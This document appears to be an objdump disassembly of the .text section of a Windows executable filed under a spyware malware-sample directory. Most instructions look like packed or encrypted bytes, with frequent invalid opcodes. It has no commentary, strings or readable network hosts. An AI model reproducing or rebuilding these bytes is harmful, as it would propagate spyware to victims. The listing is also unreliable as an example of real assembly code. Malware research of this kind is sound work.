
malware_samples/spyware/5ec9325b6998e8749bc0465890f201e3d8fddb767b2eeebb4f84fd7cf942930a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	59                   	pop    %ecx
  401001:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401002:	7a ed                	jp     0x400ff1
  401004:	24 40                	and    $0x40,%al
  401006:	3e 91                	ds xchg %eax,%ecx
  401008:	29 60 3c             	sub    %esp,0x3c(%eax)
  40100b:	66 68 64 4e          	pushw  $0x4e64
  40100f:	69 e3 20 1e 6e e3    	imul   $0xe36e1e20,%ebx,%esp
  401015:	30 1e                	xor    %bl,(%esi)
  401017:	76 e1                	jbe    0x400ffa
  401019:	66 82 65 68 64       	data16 andb $0x64,0x68(%ebp)
  40101e:	3a a5 3b 32 6d ed    	cmp    -0x1292cdc5(%ebp),%ah
  401024:	2c 40                	sub    $0x40,%al
  401026:	2a 36                	sub    (%esi),%dh
  401028:	02 9a 52 66 78 24    	add    0x24786652(%edx),%bl
  40102e:	3a 02                	cmp    (%edx),%al
  401030:	97                   	xchg   %eax,%edi
  401031:	51                   	push   %ecx
  401032:	3a 66 68             	cmp    0x68(%esi),%ah
  401035:	64 5e                	fs pop %esi
  401037:	ef                   	out    %eax,(%dx)
  401038:	4d                   	dec    %ebp
  401039:	64 3a 66 68          	cmp    %fs:0x68(%esi),%ah
  40103d:	ef                   	out    %eax,(%dx)
  40103e:	7e 42                	jle    0x401082
  401040:	48                   	dec    %eax
  401041:	ef                   	out    %eax,(%dx)
  401042:	62 6e e3             	bound  %ebp,-0x1d(%esi)
  401045:	14 36                	adc    $0x36,%al
  401047:	e5 96                	in     $0x96,%eax
  401049:	9b                   	fwait
  40104a:	4e                   	dec    %esi
  40104b:	46                   	inc    %esi
  40104c:	53                   	push   %ebx
  40104d:	10 1e                	adc    %bl,(%esi)
  40104f:	42                   	inc    %edx
  401050:	1c 7e                	sbb    $0x7e,%al
  401052:	b7 52                	mov    $0x52,%bh
  401054:	1e                   	push   %ds
  401055:	ef                   	out    %eax,(%dx)
  401056:	36 d5 e3             	ss aad $0xe3
  401059:	28 1e                	sub    %bl,(%esi)
  40105b:	6e                   	outsb  %ds:(%esi),(%dx)
  40105c:	e3 2c                	jecxz  0x40108a
  40105e:	36 e5 14             	ss in  $0x14,%eax
  401061:	d7                   	xlat   %ds:(%ebx)
  401062:	3e 66 1d b3 c5       	ds sbb $0xc5b3,%ax
  401067:	32 db                	xor    %bl,%bl
  401069:	6c                   	insb   (%dx),%es:(%edi)
  40106a:	d1 b7 0c eb 3f 66    	shll   $1,0x663feb0c(%edi)
  401070:	68 64 3a e5 ac       	push   $0xace53a64
  401075:	68 65 38 33 a7       	push   $0xa7333865
  40107a:	6f                   	outsl  %ds:(%esi),(%dx)
  40107b:	ef                   	out    %eax,(%dx)
  40107c:	8d 37                	lea    (%edi),%esi
  40107e:	6c                   	insb   (%dx),%es:(%edi)
  40107f:	31 3d 0e 3a 0c 68    	xor    %edi,0x680c3a0e
  401085:	0c a8                	or     $0xa8,%al
  401087:	76 28                	jbe    0x4010b1
  401089:	64 c5 13             	lds    %fs:(%ebx),%edx
  40108c:	60                   	pusha
  40108d:	8c d4                	mov    %ss,%esp
  40108f:	0c 68                	or     $0x68,%al
  401091:	64 67 39 36 3f b3    	cmp    %esi,%fs:-0x4cc1
  401097:	8a 35 a7 c6 33 e1    	mov    0xe133c6a7,%dh
  40109d:	81 b9 8a 60 37 6c 31 	cmpl   $0x67ef3d31,0x6c37608a(%ecx)
  4010a4:	3d ef 67 
  4010a7:	6a e3                	push   $0xffffffe3
  4010a9:	21 32                	and    %esi,(%edx)
  4010ab:	c5 e4 c4             	(bad)
  4010ae:	78 66                	js     0x401116
  4010b0:	e1 79                	loope  0x40112b
  4010b2:	aa                   	stos   %al,%es:(%edi)
  4010b3:	c6                   	(bad)
  4010b4:	2a 64 cd 26          	sub    0x26(%ebp,%ecx,8),%ah
  4010b8:	6c                   	insb   (%dx),%es:(%edi)
  4010b9:	62 3a                	bound  %edi,(%edx)
  4010bb:	66 68 6b bf          	pushw  $0xbf6b
  4010bf:	da 68 64             	fisubrl 0x64(%eax)
  4010c2:	3a ef                	cmp    %bh,%ch
  4010c4:	2d 9c b1 23 78       	sub    $0x7823b19c,%eax
  4010c9:	ed                   	in     (%dx),%eax
  4010ca:	7f 9a                	jg     0x401066
  4010cc:	cb                   	lret
  4010cd:	f4                   	hlt
  4010ce:	9a 24 68 e9 7f 9e e1 	lcall  $0xe19e,$0x7fe96824
  4010d5:	27                   	daa
  4010d6:	c6                   	(bad)
  4010d7:	ed                   	in     (%dx),%eax
  4010d8:	1b 68 b1             	sbb    -0x4f(%eax),%ebp
  4010db:	1d 60 e7 c4 99       	sbb    $0x99c4e760,%eax
  4010e0:	67 e0 92             	loopnew 0x401075
  4010e3:	66 68 64 b7          	pushw  $0xb764
  4010e7:	6a 1e                	push   $0x1e
  4010e9:	e7 46                	out    %eax,$0x46
  4010eb:	e9 6c 64 4e 1b       	jmp    0x1b8e755c
  4010f0:	3e 31 b7 0d 78 ef 7f 	xor    %esi,%ds:0x7fef780d(%edi)
  4010f7:	8a e3                	mov    %bl,%ah
  4010f9:	64 b1 66             	fs mov $0x66,%cl
  4010fc:	cb                   	lret
  4010fd:	54                   	push   %esp
  4010fe:	9a 24 68 ef 6f 8a e3 	lcall  $0xe38a,$0x6fef6824
  401105:	66 99                	cwtd
  401107:	52                   	push   %edx
  401108:	c8 26 3a ed          	enter  $0x3a26,$0xed
  40110c:	2a 60 99             	sub    -0x67(%eax),%ah
  40110f:	5e                   	pop    %esi
  401110:	c8 26 3a 30          	enter  $0x3a26,$0x30
  401114:	3f                   	aas
  401115:	35 83 72 68 64       	xor    $0x64687283,%eax
  40111a:	3a eb                	cmp    %bl,%ch
  40111c:	55                   	push   %ebp
  40111d:	58                   	pop    %eax
  40111e:	9a 24 68 ef 0f 52 c8 	lcall  $0xc852,$0xfef6824
  401125:	26 3a 95 cd e9 07 5a 	cmp    %es:0x5a07e9cd(%ebp),%dl
  40112c:	c8 26 3a ef          	enter  $0x3a26,$0xef
  401130:	55                   	push   %ebp
  401131:	50                   	push   %eax
  401132:	9a 24 68 3d 65 38 97 	lcall  $0x9738,$0x653d6824
  401139:	30 b5 62 35 3a b1    	xor    %dh,-0x4ec5ca9e(%ebp)
  40113f:	3b 64 6d fa          	cmp    -0x6(%ebp,%ebp,2),%esp
  401143:	12 40 1c             	adc    0x1c(%eax),%al
  401146:	0e                   	push   %cs
  401147:	ed                   	in     (%dx),%eax
  401148:	13 6c 69 8e          	adc    -0x72(%ecx,%ebp,2),%ebp
  40114c:	42                   	inc    %edx
  40114d:	9b                   	fwait
  40114e:	c5 99 eb a0 3e eb    	lds    -0x14c15f15(%ecx),%ebx
  401154:	03 74 6c 35          	add    0x35(%esp,%ebp,2),%esi
  401158:	80 a7 c4 99 97 e7 fe 	andb   $0xfe,-0x1868663c(%edi)
  40115f:	6e                   	outsb  %ds:(%esi),(%dx)
  401160:	e5 68                	in     $0x68,%eax
  401162:	4c                   	dec    %esp
  401163:	ed                   	in     (%dx),%eax
  401164:	6c                   	insb   (%dx),%es:(%edi)
  401165:	eb b1                	jmp    0x401118
  401167:	25 64 9b 6e e9       	and    $0xe96e9b64,%eax
  40116c:	60                   	pusha
  40116d:	ef                   	out    %eax,(%dx)
  40116e:	41                   	inc    %ecx
  40116f:	6e                   	outsb  %ds:(%esi),(%dx)
  401170:	e5 68                	in     $0x68,%eax
  401172:	4c                   	dec    %esp
  401173:	ed                   	in     (%dx),%eax
  401174:	5c                   	pop    %esp
  401175:	eb d3                	jmp    0x40114a
  401177:	04 97                	add    $0x97,%al
  401179:	9b                   	fwait
  40117a:	c5 57 a8             	lds    -0x58(%edi),%edx
  40117d:	8f                   	(bad)
  40117e:	4b                   	dec    %ebx
  40117f:	33 e5                	xor    %ebp,%esp
  401181:	0f 2a 0c 97          	cvtpi2ps (%edi,%edx,4),%xmm1
  401185:	37                   	aaa
  401186:	d2 f3                	shl    %cl,%bl
  401188:	96                   	xchg   %eax,%esi
  401189:	9b                   	fwait
  40118a:	c5 e5 ac             	(bad)
  40118d:	68 50 66 af 61       	push   $0x61af6650
  401192:	2a c6                	sub    %dh,%al
  401194:	2a 64 31 66          	sub    0x66(%ecx,%esi,1),%ah
  401198:	68 64 50 6d 80       	push   $0x806d5064
  40119d:	93                   	xchg   %eax,%ebx
  40119e:	56                   	push   %esi
  40119f:	66 68 e7 fe          	pushw  $0xfee7
  4011a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4011a4:	61                   	popa
  4011a5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4011a6:	4f                   	dec    %edi
  4011a7:	47                   	inc    %edi
  4011a8:	02 64 fd 63          	add    0x63(%ebp,%edi,8),%ah
  4011ac:	78 c4                	js     0x401172
  4011ae:	78 66                	js     0x401216
  4011b0:	60                   	pusha
  4011b1:	64 3a 66 02          	cmp    %fs:0x2(%esi),%ah
  4011b5:	6c                   	insb   (%dx),%es:(%edi)
  4011b6:	d2 bb 04 64 3a e5    	sarb   %cl,-0x1ac59bfc(%ebx)
  4011bc:	ac                   	lods   %ds:(%esi),%al
  4011bd:	6c                   	insb   (%dx),%es:(%edi)
  4011be:	33 a6 1d 63 82 67    	xor    0x6782631d(%esi),%esp
  4011c4:	68 64 3a 8d 4f       	push   $0x4f8d3a64
  4011c9:	e7 c2                	out    %eax,$0xc2
  4011cb:	99                   	cltd
  4011cc:	1c 4e                	sbb    $0x4e,%al
  4011ce:	6a 99                	push   $0xffffff99
  4011d0:	5d                   	pop    %ebp
  4011d1:	74 9a                	je     0x40116d
  4011d3:	24 68                	and    $0x68,%al
  4011d5:	8c 84 0a 68 64 b9 a2 	mov    %es,-0x5d469b98(%edx,%ecx,1)
  4011dc:	60                   	pusha
  4011dd:	9b                   	fwait
  4011de:	0f 76 c8             	pcmpeqd %mm0,%mm1
  4011e1:	26 3a 8e f0 08 3a 66 	cmp    %es:0x663a08f0(%esi),%cl
  4011e8:	eb a0                	jmp    0x40118a
  4011ea:	3e de 69 64          	fisubrs %ds:0x64(%ecx)
  4011ee:	3a 66 35             	cmp    0x35(%esi),%ah
  4011f1:	3b 64 3d e1          	cmp    -0x1f(%ebp,%edi,1),%esp
  4011f5:	88 67 a5             	mov    %ah,-0x5b(%edi)
  4011f8:	eb 59                	jmp    0x401253
  4011fa:	16                   	push   %ss
  4011fb:	c6                   	(bad)
  4011fc:	2a 64 3a 13          	sub    0x13(%edx,%edi,1),%ah
  401200:	6f                   	outsl  %ds:(%esi),(%dx)
  401201:	dc 3b                	fdivrl (%ebx)
  401203:	66 68 64 d1          	pushw  $0xd164
  401207:	8e c9                	mov    %ecx,%cs
  401209:	48                   	dec    %eax
  40120a:	9a 24 68 0e 31 99 88 	lcall  $0x8899,$0x310e6824
  401211:	3c 82                	cmp    $0x82,%al
  401213:	67 68 64 3a 8d bf    	addr16 push $0xbf8d3a64
  401219:	00 9b 66 68 64 3a    	add    %bl,0x3a646866(%ebx)
  40121f:	33 e1                	xor    %ecx,%esp
  401221:	81 50 99 00 78 9a 24 	adcl   $0x249a7800,-0x67(%eax)
  401228:	68 0c a0 76 28       	push   $0x2876a00c
  40122d:	64 6a 02             	fs push $0x2
  401230:	e1 41                	loope  0x401273
  401232:	3a 66 68             	cmp    0x68(%esi),%ah
  401235:	64 b9 8a 78 37 6c    	fs mov $0x6c37788a,%ecx
  40123b:	31 e1                	xor    %esp,%ecx
  40123d:	01 d2                	add    %edx,%edx
  40123f:	36 b1 58             	ss mov $0x58,%cl
  401242:	1e                   	push   %ds
  401243:	00 e9                	add    %ch,%cl
  401245:	68 1e 66 6b bd       	push   $0xbd6b661e
  40124a:	16                   	push   %ss
  40124b:	42                   	inc    %edx
  40124c:	eb a0                	jmp    0x4011ee
  40124e:	3e 0c 68             	ds or  $0x68,%al
  401251:	0e                   	push   %cs
  401252:	3a 0e                	cmp    (%esi),%cl
  401254:	40                   	inc    %eax
  401255:	c4 78 66             	les    0x66(%eax),%edi
  401258:	00 40 9a             	add    %al,-0x66(%eax)
  40125b:	24 68                	and    $0x68,%al
  40125d:	0c 1a                	or     $0x1a,%al
  40125f:	c6                   	(bad)
  401260:	2a 64 d2 df          	sub    -0x21(%edx,%edx,8),%ah
  401264:	03 64 3a 99          	add    -0x67(%edx,%edi,1),%esp
  401268:	5d                   	pop    %ebp
  401269:	4c                   	dec    %esp
  40126a:	9a 24 68 9b 0f 42 c8 	lcall  $0xc842,$0xf9b6824
  401271:	26 3a 99 5d 44 9a 24 	cmp    %es:0x249a445d(%ecx),%bl
  401278:	68 ed 1f 72 c8       	push   $0xc8721fed
  40127d:	26 3a 8e 94 02 3a 66 	cmp    %es:0x663a0294(%esi),%cl
  401284:	eb a0                	jmp    0x401226
  401286:	22 57 a1             	and    -0x5f(%edi),%dl
  401289:	ed                   	in     (%dx),%eax
  40128a:	77 9a                	ja     0x401226
  40128c:	38 8c 84 0d 68 64 f3 	cmp    %cl,-0xc9b97f3(%esp,%eax,4)
  401293:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401294:	0c c7                	or     $0xc7,%al
  401296:	3a 66 68             	cmp    0x68(%esi),%ah
  401299:	64 f9                	fs stc
  40129b:	66 3d ed df          	cmp    $0xdfed,%ax
  40129f:	de 78 28             	fidivrs 0x28(%eax)
  4012a2:	3b 66 80             	cmp    -0x80(%esi),%esp
  4012a5:	5f                   	pop    %edi
  4012a6:	5d                   	pop    %ebp
  4012a7:	66 68 37 6c          	pushw  $0x6c37
  4012ab:	31 d7                	xor    %edx,%edi
  4012ad:	e6 57                	out    %al,$0x57
  4012af:	36 06                	ss push %es
  4012b1:	ed                   	in     (%dx),%eax
  4012b2:	c2 67 90             	ret    $0x9067
  4012b5:	ed                   	in     (%dx),%eax
  4012b6:	fd                   	std
  4012b7:	0c 68                	or     $0x68,%al
  4012b9:	0e                   	push   %cs
  4012ba:	3a 0c 6b             	cmp    (%ebx,%ebp,2),%cl
  4012bd:	0e                   	push   %cs
  4012be:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  4012c1:	0c 3a                	or     $0x3a,%al
  4012c3:	66 68 e4 52          	pushw  $0x52e4
  4012c7:	46                   	inc    %esi
  4012c8:	e8 24 3a 8e f0       	call   0xf0ce4cf1
  4012cd:	0c 3a                	or     $0x3a,%al
  4012cf:	66 e1 a7             	data16 loope 0x401279
  4012d2:	b9 9d 97 11 3e       	mov    $0x3e11979d,%ecx
  4012d7:	57                   	push   %edi
  4012d8:	a8 8f                	test   $0x8f,%al
  4012da:	52                   	push   %edx
  4012db:	ef                   	out    %eax,(%dx)
  4012dc:	90                   	nop
  4012dd:	4d                   	dec    %ebp
  4012de:	c2 ef af             	ret    $0xafef
  4012e1:	0e                   	push   %cs
  4012e2:	3a eb                	cmp    %bl,%ch
  4012e4:	ed                   	in     (%dx),%eax
  4012e5:	90                   	nop
  4012e6:	89 98 97 34 52 6e    	mov    %ebx,0x6e523497(%eax)
  4012ec:	24 65                	and    $0x65,%al
  4012ee:	3a eb                	cmp    %bl,%ch
  4012f0:	ed                   	in     (%dx),%eax
  4012f1:	9c                   	pushf
  4012f2:	89 98 97 34 69 8e    	mov    %ebx,-0x7196cb69(%eax)
  4012f8:	10 0c 3a             	adc    %cl,(%edx,%edi,1)
  4012fb:	66 3b 8c a0 01 68 64 	cmp    0xb646801(%eax,%eiz,4),%cx
  401302:	0b 
  401303:	90                   	nop
  401304:	02 65 52             	add    0x52(%ebp),%ah
  401307:	e6 f9                	out    %al,$0xf9
  401309:	26 3a eb             	es cmp %bl,%ch
  40130c:	ec                   	in     (%dx),%al
  40130d:	51                   	push   %ecx
  40130e:	c2 d5 96             	ret    $0x96d5
  401311:	9b                   	fwait
  401312:	6a 8e                	push   $0xffffff8e
  401314:	4b                   	dec    %ebx
  401315:	65 3a 66 eb          	cmp    %gs:-0x15(%esi),%ah
  401319:	a0 36 5b 97 9b       	mov    0x9b975b36,%al
  40131e:	3a 66 1c             	cmp    0x1c(%esi),%ah
  401321:	61                   	popa
  401322:	0b a6 28 8f 26 de    	or     -0x21d970d8(%esi),%esp
  401328:	f4                   	hlt
  401329:	14 3a                	adc    $0x3a,%al
  40132b:	66 9f                	data16 lahf
  40132d:	83 b3 e3 98 d7 c4 99 	xorl   $0xffffff99,-0x3b28671d(%ebx)
  401334:	e1 a3                	loope  0x4012d9
  401336:	b9 a0 79 5f 8f       	mov    $0x8f5f79a0,%ecx
  40133b:	92                   	xchg   %eax,%edx
  40133c:	db 9a c5 14 ab 55    	fistpl 0x55ab14c5(%edx)
  401342:	fa                   	cli
  401343:	39 36                	cmp    %esi,(%esi)
  401345:	3f                   	aas
  401346:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401348:	3d ed df 37 38       	cmp    $0x3837dfed,%eax
  40134d:	32 6d d9             	xor    -0x27(%ebp),%ch
  401350:	36 5e                	ss pop %esi
  401352:	c6                   	(bad)
  401353:	1e                   	push   %ds
  401354:	e1 9c                	loope  0x4012f2
  401356:	0b 9e e1 a3 b7 23    	or     0x23b7a3e1(%esi),%ebx
  40135c:	90                   	nop
  40135d:	34 b7                	xor    $0xb7,%al
  40135f:	23 94 34 50 66 00 5b 	and    0x5b006650(%esp,%esi,1),%edx
  401366:	3a 69 68             	cmp    0x68(%ecx),%ch
  401369:	0e                   	push   %cs
  40136a:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  40136d:	0e                   	push   %cs
  40136e:	3a 99 1d 68 c5 13    	cmp    0x13c5681d(%ecx),%bl
  401374:	60                   	pusha
  401375:	8c 7c 0c 68          	mov    %?,0x68(%esp,%ecx,1)
  401379:	64 b3 a0             	fs mov $0xa0,%bl
  40137c:	e9 8b 9b 3a 68       	jmp    0x687aaf0c
  401381:	64 33 90 1c 60 0b a6 	xor    %fs:-0x59f49fe4(%eax),%edx
  401388:	83 5a c5 13          	sbbl   $0x13,-0x3b(%edx)
  40138c:	70 9b                	jo     0x401329
  40138e:	4f                   	dec    %edi
  40138f:	72 97                	jb     0x401328
  401391:	11 26                	adc    %esp,(%esi)
  401393:	0c 68                	or     $0x68,%al
  401395:	9b                   	fwait
  401396:	4f                   	dec    %edi
  401397:	76 97                	jbe    0x401330
  401399:	11 c6                	adc    %eax,%esi
  40139b:	8e 38                	mov    (%eax),%?
  40139d:	0e                   	push   %cs
  40139e:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  4013a1:	a2 c5 13 94 8c       	mov    %al,0x8c9413c5
  4013a6:	18 0c 68             	sbb    %cl,(%eax,%ebp,2)
  4013a9:	64 33 90 1c 60 0b a6 	xor    %fs:-0x59f49fe4(%eax),%edx
  4013b0:	83 72 b9 1b          	xorl   $0x1b,-0x47(%edx)
  4013b4:	90                   	nop
  4013b5:	65 4f                	gs dec %edi
  4013b7:	61                   	popa
  4013b8:	d0 66 3a             	shlb   $1,0x3a(%esi)
  4013bb:	66 68 8f 33          	pushw  $0x338f
  4013bf:	e7 87                	out    %eax,$0x87
  4013c1:	5d                   	pop    %ebp
  4013c2:	26 66 68 55 fa       	es pushw $0xfa55
  4013c7:	26 37                	es aaa
  4013c9:	3a f3                	cmp    %bl,%dh
  4013cb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4013cc:	3d ed df 37 38       	cmp    $0x3837dfed,%eax
  4013d1:	32 6d d9             	xor    -0x27(%ebp),%ch
  4013d4:	07                   	pop    %es
  4013d5:	42                   	inc    %edx
  4013d6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4013d7:	5f                   	pop    %edi
  4013d8:	e1 9c                	loope  0x401376
  4013da:	3b 9e e1 a3 b7 23    	cmp    0x23b7a3e1(%esi),%ebx
  4013e0:	94                   	xchg   %eax,%esp
  4013e1:	34 52                	xor    $0x52,%al
  4013e3:	7f 68                	jg     0x40144d
  4013e5:	66 3a 0c 68          	data16 cmp (%eax,%ebp,2),%cl
  4013e9:	9b                   	fwait
  4013ea:	4f                   	dec    %edi
  4013eb:	6a 97                	push   $0xffffff97
  4013ed:	11 32                	adc    %esi,(%edx)
  4013ef:	8e 8c 0d 3a 66 e1 a2 	mov    -0x5d1e99c6(%ebp,%ecx,1),%cs
  4013f6:	33 90 1c 60 0b a6    	xor    -0x59f49fe4(%eax),%edx
  4013fc:	83 5d c5 13          	sbbl   $0x13,-0x3b(%ebp)
  401400:	70 9b                	jo     0x40139d
  401402:	4f                   	dec    %edi
  401403:	72 97                	jb     0x40139c
  401405:	11 26                	adc    %esp,(%esi)
  401407:	0c 68                	or     $0x68,%al
  401409:	9b                   	fwait
  40140a:	4f                   	dec    %edi
  40140b:	76 97                	jbe    0x4013a4
  40140d:	11 c6                	adc    %eax,%esi
  40140f:	8e b8 0d 3a 66 e1    	mov    -0x1e99c5f3(%eax),%?
  401415:	a2 c5 13 94 8c       	mov    %al,0x8c9413c5
  40141a:	94                   	xchg   %eax,%esp
  40141b:	0f 68 64 33 90       	punpckhbw -0x70(%ebx,%esi,1),%mm4
  401420:	1c 60                	sbb    $0x60,%al
  401422:	0b a6 83 75 0b a6    	or     -0x59f48a7d(%esi),%esp
  401428:	28 8f 36 de 31 2f    	sub    %cl,0x2f31de36(%edi)
  40142e:	3a 66 9f             	cmp    -0x61(%esi),%ah
  401431:	83 b3 23 90 ed fd 39 	xorl   $0x39,-0x2126fdd(%ebx)
  401438:	36 ad                	lods   %ss:(%esi),%eax
  40143a:	f9                   	stc
  40143b:	33 e1                	xor    %ecx,%esp
  40143d:	81 b9 8a 64 37 6c 31 	cmpl   $0x3611e331,0x6c37648a(%ecx)
  401444:	e3 11 36 
  401447:	dd 12                	fstl   (%edx)
  401449:	48                   	dec    %eax
  40144a:	1f                   	pop    %ds
  40144b:	25 e9 97 e1 5f       	and    $0x5fe197e9,%eax
  401450:	68 64 c5 63 68       	push   $0x6863c564
  401455:	c5 78 66             	lds    0x66(%eax),%edi
  401458:	eb 01                	jmp    0x40145b
  40145a:	ce                   	into
  40145b:	66 eb 01             	data16 jmp 0x40145f
  40145e:	c2 66 83             	ret    $0x8366
  401461:	02 b9 03 94 64 b3    	add    -0x4c9b6bfd(%ecx),%bh
  401467:	be 69 bc b3 a5       	mov    $0xa5b3bc69,%esi
  40146c:	97                   	xchg   %eax,%edi
  40146d:	61                   	popa
  40146e:	3a c7                	cmp    %bh,%al
  401470:	2a 64 0b 99          	sub    -0x67(%ebx,%ecx,1),%ah
  401474:	83 5b b1 23          	sbbl   $0x23,-0x4f(%ebx)
  401478:	90                   	nop
  401479:	65 c2 ed 3d          	gs ret $0x3ded
  40147d:	6c                   	insb   (%dx),%es:(%edi)
  40147e:	35 d8 6c 66 35       	xor    $0x35666cd8,%eax
  401483:	d8 7c 5a 03          	fdivrs 0x3(%edx,%ebx,2)
  401487:	b6 1d                	mov    $0x1d,%dh
  401489:	67 c5 23             	lds    (%bp,%di),%esp
  40148c:	94                   	xchg   %eax,%esp
  40148d:	ed                   	in     (%dx),%eax
  40148e:	cb                   	lret
  40148f:	e5 a0                	in     $0xa0,%eax
  401491:	9b                   	fwait
  401492:	7a e6                	jp     0x40147a
  401494:	54                   	push   %esp
  401495:	65 3a 13             	cmp    %gs:(%ebx),%dl
  401498:	91                   	xchg   %eax,%ecx
  401499:	5d                   	pop    %ebp
  40149a:	7f 9a                	jg     0x401436
  40149c:	1d 74 c5 23 9c       	sbb    $0x9c23c574,%eax
  4014a1:	ef                   	out    %eax,(%dx)
  4014a2:	7f 76                	jg     0x40151a
  4014a4:	51                   	push   %ecx
  4014a5:	21 ce                	and    %ecx,%esi
  4014a7:	13 6d ef             	adc    -0x11(%ebp),%ebp
  4014aa:	7f 9e                	jg     0x40144a
  4014ac:	83 5f b3 be          	sbbl   $0xffffffbe,-0x4d(%edi)
  4014b0:	59                   	pop    %ecx
  4014b1:	bc b3 a5 2f ed       	mov    $0xed2fa5b3,%esp
  4014b6:	cb                   	lret
  4014b7:	e5 a0                	in     $0xa0,%eax
  4014b9:	9b                   	fwait
  4014ba:	7a e6                	jp     0x4014a2
  4014bc:	54                   	push   %esp
  4014bd:	65 3a 13             	cmp    %gs:(%ebx),%dl
  4014c0:	91                   	xchg   %eax,%ecx
  4014c1:	5d                   	pop    %ebp
  4014c2:	fd                   	std
  4014c3:	14 d9                	adc    $0xd9,%al
  4014c5:	9b                   	fwait
  4014c6:	7f 9e                	jg     0x401466
  4014c8:	e3 21                	jecxz  0x4014eb
  4014ca:	32 ef                	xor    %bh,%ch
  4014cc:	a9 e7 f2 99 28       	test   $0x2899f2e7,%eax
  4014d1:	e4 06                	in     $0x6,%al
  4014d3:	67 68 11 c3 5f 2d    	addr16 push $0x2d5fc311
  4014d9:	9c                   	pushf
  4014da:	48                   	dec    %eax
  4014db:	e0 d0                	loopne 0x4014ad
  4014dd:	9b                   	fwait
  4014de:	c5 66 68             	lds    0x68(%esi),%esp
  4014e1:	8f                   	(bad)
  4014e2:	3c ef                	cmp    $0xef,%al
  4014e4:	b0 65                	mov    $0x65,%al
  4014e6:	e2 ef                	loop   0x4014d7
  4014e8:	ab                   	stos   %eax,%es:(%edi)
  4014e9:	3b 64 3d a1          	cmp    -0x5f(%ebp,%edi,1),%esp
  4014ed:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4014ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4014ef:	ef                   	out    %eax,(%dx)
  4014f0:	8d                   	lea    (bad),%ebx
  4014f1:	dc 3e                	fdivrl (%esi)
  4014f3:	66 69 64 d2 8f 0c 64 	imul   $0x640c,-0x71(%edx,%edx,8),%sp
  4014fa:	3a 35 3e 33 b1 13    	cmp    0x13b1333e,%dh
  401500:	64 ef                	fs out %eax,(%dx)
  401502:	67 76 af             	addr16 jbe 0x4014b4
  401505:	e1 c6                	loope  0x4014cd
  401507:	99                   	cltd
  401508:	96                   	xchg   %eax,%esi
  401509:	9b                   	fwait
  40150a:	72 76                	jb     0x401582
  40150c:	bb 79 b1 e3 94       	mov    $0x94e3b179,%ebx
  401511:	9b                   	fwait
  401512:	c4 99 e1 a6 13 a4    	les    -0x5bec591f(%ecx),%ebx
  401518:	e1 f1                	loope  0x40150b
  40151a:	c6                   	(bad)
  40151b:	99                   	cltd
  40151c:	96                   	xchg   %eax,%esi
  40151d:	9b                   	fwait
  40151e:	c5 63 68             	lds    0x68(%ebx),%esp
  401521:	c5 78 66             	lds    0x66(%eax),%edi
  401524:	e3 21                	jecxz  0x401547
  401526:	32 ef                	xor    %bh,%ch
  401528:	a9 e7 f2 99 28       	test   $0x2899f2e7,%eax
  40152d:	e4 06                	in     $0x6,%al
  40152f:	67 68 11 c3 5f ae    	addr16 push $0xae5fc311
  401535:	12 33                	adc    (%ebx),%dh
  401537:	a0 ed 65 3a 99       	mov    0x993a65ed,%al
  40153c:	97                   	xchg   %eax,%edi
  40153d:	64 d1 50 e1          	rcll   $1,%fs:-0x1f(%eax)
  401541:	93                   	xchg   %eax,%ebx
  401542:	d1 74 e1 9c          	shll   $1,-0x64(%ecx,%eiz,8)
  401546:	13 96 e3 31 32 ec    	adc    -0x13cdce1d(%esi),%edx
  40154c:	7c 5e                	jl     0x4015ac
  40154e:	b2 f2                	mov    $0xf2,%dl
  401550:	6d                   	insl   (%dx),%es:(%edi)
  401551:	65 3a 99 97 23 03 b9 	cmp    %gs:-0x46fcdc69(%ecx),%bl
  401558:	14 8e                	adc    $0x8e,%al
  40155a:	b1 e3                	mov    $0xe3,%cl
  40155c:	94                   	xchg   %eax,%esp
  40155d:	9b                   	fwait
  40155e:	c4 99 e1 a6 0b a4    	les    -0x5bf4591f(%ecx),%ebx
  401564:	e1 f1                	loope  0x401557
  401566:	c6                   	(bad)
  401567:	99                   	cltd
  401568:	96                   	xchg   %eax,%esi
  401569:	9b                   	fwait
  40156a:	b3 be                	mov    $0xbe,%bl
  40156c:	41                   	inc    %ecx
  40156d:	94                   	xchg   %eax,%esp
  40156e:	fc                   	cld
  40156f:	e2 6d                	loop   0x4015de
  401571:	65 3a 99 97 64 b7 e3 	cmp    %gs:-0x1c489b69(%ecx),%bl
  401578:	69 64 c5 99 37 3a 61 	imul   $0xaf613a37,-0x67(%ebp,%eax,8),%esp
  40157f:	af 
  401580:	ab                   	stos   %eax,%es:(%edi)
  401581:	31 b3 83 eb 88 2a    	xor    %esi,0x2a88eb83(%ebx)
  401587:	35 3e 33 b1 3b       	xor    $0x3bb1333e,%eax
  40158c:	64 a3 7f 9a 1a 03    	mov    %eax,%fs:0x31a9a7f
  401592:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401593:	22 e3                	and    %bl,%ah
  401595:	21 c6                	and    %eax,%esi
  401597:	ef                   	out    %eax,(%dx)
  401598:	aa                   	stos   %al,%es:(%edi)
  401599:	65 f8                	gs clc
  40159b:	ef                   	out    %eax,(%dx)
  40159c:	3d 98 0b 90 83       	cmp    $0x83900b98,%eax
  4015a1:	42                   	inc    %edx
  4015a2:	d2 83 00 64 3a ed    	rolb   %cl,-0x12c59c00(%ebx)
  4015a8:	15 6c 80 b5 25       	adc    $0x25b5806c,%eax
  4015ad:	06                   	push   %es
  4015ae:	2a 37                	sub    (%edi),%dh
  4015b0:	e1 a5                	loope  0x401557
  4015b2:	cd 8c                	int    $0x8c
  4015b4:	a9 9e 3d a7 91       	test   $0x91a73d9e,%eax
  4015b9:	7b 13                	jnp    0x4015ce
  4015bb:	ac                   	lods   %ds:(%esi),%al
  4015bc:	e1 b4                	loope  0x401572
  4015be:	63 ef                	arpl   %ebp,%edi
  4015c0:	aa                   	stos   %al,%es:(%edi)
  4015c1:	e7 f8                	out    %eax,$0xf8
